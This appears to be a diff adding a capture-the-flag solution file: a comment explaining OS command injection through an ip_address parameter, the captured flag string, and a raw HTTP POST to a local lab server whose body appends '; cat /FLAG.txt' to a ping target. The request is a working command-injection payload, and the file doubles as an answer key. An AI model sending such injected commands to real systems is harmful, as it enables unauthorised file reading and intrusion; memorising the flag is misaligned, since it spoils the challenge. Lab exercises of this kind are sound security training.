@@ -1,0 +1,8 @@
+# OS Command Injection via ip_address parameter. Semicolon separates ping from injected command. FLAG extracted from /FLAG.txt: flag{e10ecfcb-fa35-4d78-9b28-5e922c08349d}
+
+POST /ping HTTP/1.1
+Host: 172.17.0.1:48109
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+ip_address=127.0.0.1%3B+cat+/FLAG.txt
